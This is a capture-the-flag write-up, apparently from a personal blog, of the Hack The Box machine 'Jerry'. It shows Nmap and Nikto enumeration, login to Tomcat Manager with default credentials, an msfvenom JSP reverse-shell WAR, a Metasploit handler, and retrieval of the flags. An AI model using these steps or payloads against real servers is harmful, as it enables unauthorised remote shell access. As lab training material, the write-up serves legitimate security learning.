---
title: "Jerry"
---

# Hack The Box - Jerry

![Cap dashboard screenshot](jerry.png)


Jerry was one of the easiest boxes I’ve done so far. It was very straightforward with no rabbit holes, and there was no privilege escalation because the user and root flags were stored together in the same file.

## Reconnaissance

I started with a standard Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -oA jerry 10.10.10.95
```

The scan showed Tomcat running on port 8080:

```text
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

Since the target was running Tomcat, I followed up with directory and vulnerability enumeration using Nikto.

```bash
nikto -h 10.10.10.95 -p 8080
```

Nikto reported several useful findings, including default credentials for the Tomcat Manager interface:

```text
Username: tomcat
Password: s3cret
```

## Initial Access

With those credentials, I logged into `/manager/html` and gained access to the Tomcat Manager page. That interface allows WAR file uploads, which made exploitation simple.

### WAR Payload

I generated a reverse JSP shell packaged as a WAR file using `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<port> -f war > reverseshell.war
```

The WAR archive contained a JSP payload with a random filename. I extracted it to determine the exact name:

```bash
jar -xvf reverseshell.war
```

That revealed the JSP file:

```text
djkwbjspxeqxnor.jsp
```

### Listener Setup

Before uploading the WAR, I started a handler to catch the reverse shell connection.

```bash
msfconsole
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST <local IP>
set LPORT <local port>
set ExitOnSession false
exploit -j
```

Then I uploaded the WAR file through Tomcat Manager.

## Shell Execution

After the WAR was deployed, I browsed to the JSP inside the application path:

```text
http://10.10.10.95:8080/reverseshell/djkwbjspxeqxnor.jsp
```

That triggered the reverse shell, and I got an Administrator shell back on my listener.

## Flags

There was no separate privilege escalation step on this box. The user and root flags were combined into a single file:

```text
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

Reading that file gave both flags and completed the machine.

## Attack Path

- **Scan the host** — identify Tomcat on port 8080.
- **Enumerate Tomcat** — use Nikto to discover default Manager credentials.
- **Log in to Manager** — access `/manager/html` with `tomcat:s3cret`.
- **Generate a WAR** — create a JSP reverse shell with `msfvenom`.
- **Find the payload name** — extract the random JSP filename from the archive.
- **Upload the WAR** — deploy it through Tomcat Manager.
- **Trigger the shell** — browse to the JSP file and catch the connection.
- **Read the flags** — retrieve both user and root from the same file.
